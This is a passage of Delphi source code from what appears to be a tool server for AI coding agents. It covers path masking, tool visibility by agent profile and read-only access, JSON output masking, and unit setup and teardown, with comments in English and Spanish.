            Largo := Copy(AText, J, 4 + 2 * Length(Sep));
            Inc(J, Length(Largo));
          end;
          if (J <= L) and (CharInSet(AText[J], ['A'..'Z', 'a'..'z', '0'..'9', '_', '[']) or
             (Ord(AText[J]) >= $80)) then
          begin
            Sb.Append(StringOfChar('\', N)).Append(Largo).Append('srvhost');
            I := J;
            while (I <= L) and not CharInSet(AText[I], ['\', '/', '"', ' ', #9]) do
              Inc(I);
            Continue;
          end;
        end;
      end;
      Sb.Append(C);
      Inc(I);
    end;
    Result := Sb.ToString;
  finally
    Sb.Free;
  end;
end;


function ToolHiddenFromList(const AToolName: string): Boolean;
const
  // the mailbox and the manual never disappear: they are how an agent asks
  // for help and how it reports that something is missing
  ALWAYS: array [0 .. 2] of string = ('delphi_help', 'delphi_messages',
    'delphi_report');
  // reader: understand and navigate, nothing that writes or ships
  READER: array [0 .. 19] of string = ('delphi_read', 'delphi_list',
    'delphi_search', 'delphi_symbols', 'delphi_definition', 'delphi_hover',
    'delphi_signature', 'delphi_completion', 'delphi_diagnostics',
    'delphi_references', 'delphi_projects', 'delphi_installs',
    'delphi_workspace', 'delphi_fetch', 'delphi_help', 'delphi_messages',
    'delphi_report', 'vault_read', 'vault_search', 'delphi_docs');
  // coder hides only the shipping trio; everything else is a coder's tool
  DEPLOY_ONLY: array [0 .. 2] of string = ('delphi_adb', 'delphi_paserver',
    'delphi_package');
var
  N, Prof: string;
begin
  N := AToolName.Trim.ToLower;
  if MatchText(N, ALWAYS) then
    Exit(False);
  // Las vault_* se registran si CUALQUIER workspace declara vault, pero solo
  // se anuncian donde sirven: ninguna a un workspace sin vault, y las de
  // escritura (las atEscritura de LA tabla de accesos) no a uno de solo
  // lectura - eran 2.760 caracteres por ronda de tools que solo rechazan
  // (6-oct-2026). Siguen llamables: la llamada dice por que no. Por lo
  // DECLARADO, sin mirar el disco: esto corre en cada tools/list, y un vault
  // en una letra de red caida lo paraba (revision del 6-oct-2026); si la
  // carpeta no esta, la llamada lo dice.
  if N.StartsWith('vault_') and
     ((VaultPath = '') or
      ((AccesoDeTool(N).Acceso = atEscritura) and not VaultModoEscritura)) then
    Exit(True);
  // A una credencial de SOLO LECTURA no se le anuncian las tools enteras de
  // escritura: la puerta se las niega siempre (LecturaDenegada) y solo
  // ocupaban sitio. Las mixtas se quedan, sus lecturas valen (David,
  // 6-oct-2026). Lo mismo que arriba: siguen llamables y la llamada dice por que.
  if IsReadOnlyNow and (AccesoDeTool(N).Acceso = atEscritura) then
    Exit(True);
  if Length(GToolsOnly) > 0 then
    Exit(not MatchText(N, GToolsOnly));
  // a workspace may carry its own profile; it wins over the global one
  Prof := GToolsProfile;
  if HasActiveWS and
     (ActiveWS.Profile <> '') then
    Prof := ActiveWS.Profile;
  if Prof = 'reader' then
    Exit(not MatchText(N, READER));
  if Prof = 'coder' then
    Exit(MatchText(N, DEPLOY_ONLY));
  Result := False; // full, or an unknown profile name: hide nothing
end;

function EnmascaraSalvoContenido(const ATexto, AEmpiezaPor: string): string;
var
  Empieza: string;
begin
  Empieza := AEmpiezaPor;
  Result := EnmascaraLineas(ATexto,
    function(const L: string): Boolean
    begin
      // (la linea vacia y la que no empieza como el contenido son de la tool)
      Result := (L <> '') and (Pos(L[1], Empieza) > 0);
    end);
  TSalidaHecha := Result;
end;

function EnmascaraSalvoCodigo(const ATexto: string): string;
var
  EnBloque: Boolean;
begin
  EnBloque := False;
  Result := EnmascaraLineas(ATexto,
    function(const L: string): Boolean
    begin
      if L.TrimLeft.StartsWith('```') then
      begin
        EnBloque := not EnBloque;
        Exit(False); // la valla es de la tool
      end;
      Result := EnBloque;
    end);
  TSalidaHecha := Result;
end;

function EnmascaraJsonSalvo(const AJson: string; const AClaves: array of string;
  const ADetras: string): string;
var
  Claves: TArray<string>;

  // una copia de AValor con sus cadenas enmascaradas, salvo lo que cuelga de
  // un campo de Claves (que se copia tal cual). Las CLAVES tambien: antes de
  // esto el texto entero pasaba por la mascara y las cubria, y un objeto con
  // rutas por clave (los changes de un WorkspaceEdit) saldria con la letra
  // real (revision de la 1.13.0)
  function Transforma(AValor: TJSONValue): TJSONValue;
  begin
    if AValor is TJSONObject then
    begin
      var O := TJSONObject.Create;
      for var P in TJSONObject(AValor) do
        if MatchText(P.JsonString.Value, Claves) then
          O.AddPair(P.JsonString.Value, TJSONValue(P.JsonValue.Clone))
        else
          O.AddPair(MaskDriveText('', P.JsonString.Value), Transforma(P.JsonValue));
      Result := O;
    end
    else if AValor is TJSONArray then
    begin
      var A := TJSONArray.Create;
      for var E in TJSONArray(AValor) do
        A.AddElement(Transforma(E));
      Result := A;
    end
    // (un TJSONNumber ES un TJSONString en el RTL)
    else if (AValor is TJSONString) and not (AValor is TJSONNumber) then
      Result := TJSONString.Create(MaskDriveText('', TJSONString(AValor).Value))
    else
      Result := TJSONValue(AValor.Clone);
  end;

var
  V, T: TJSONValue;
begin
  V := TJSONObject.ParseJSONValue(AJson);
  if V = nil then
    Exit(MaskDriveText('', AJson + ADetras));
  try
    Claves := [];
    for var C in AClaves do
      Claves := Claves + [C];
    T := Transforma(V);
    try
      Result := T.ToJSON;
    finally
      T.Free;
    end;
  finally
    V.Free;
  end;
  Result := Result + MaskDriveText('', ADetras);
  TSalidaHecha := Result;
end;

procedure OlvidaSalidaHecha;
begin
  TSalidaHecha := '';
  TCitasHechas := '';
end;

initialization
  GIdentLock := TCriticalSection.Create;
  GDrvLock := TCriticalSection.Create;
  GSesiones := TList<TSesion>.Create;
  GCaducadas := TStringList.Create;
  ConstruyeAccesos; // la tabla de accesos, antes de la primera llamada

finalization

  GSesiones.Free;
  GCaducadas.Free;
  GIdentLock.Free;
  // (GDrvLock no se libera: el enmascarador lo usa desde cualquier hilo que
  // aun este contestando, y se va con el proceso)

end.